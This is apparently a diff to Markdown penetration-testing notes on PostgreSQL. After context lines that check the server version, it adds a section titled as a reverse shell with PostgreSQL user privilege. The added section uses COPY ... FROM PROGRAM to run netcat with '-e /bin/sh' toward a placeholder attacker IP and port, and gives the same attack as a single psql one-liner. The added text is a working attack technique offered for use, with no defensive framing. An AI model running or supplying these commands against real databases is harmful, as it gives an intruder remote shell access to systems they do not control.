@@ -175,3 +175,15 @@ postgres=# \q
 # check version
 postgres=# SELECT version();
 ```
+
+Reverse shell with PostgreSQL user privilege.
+
+```shell
+postgres=# DROP TABLE IF EXISTS RevCmd;
+postgres=# CREATE TABLE RevCmd(rev_cmd text);
+postgres=# COPY RevCmd FROM PROGRAM '/tmp/nc -e /bin/sh <attacker ip> <attacker port>';
+# try different commands, e.g., id
+# postgres=# SELECT * FROM RevCmd;
+# one liner
+$ psql -U postgres -h localhost -c "DROP TABLE IF EXISTS RevCmd;CREATE TABLE RevCmd(rev_cmd text);COPY RevCmd FROM PROGRAM '/tmp/nc -e /bin/sh <attacker ip> <attacker port>';"
+```
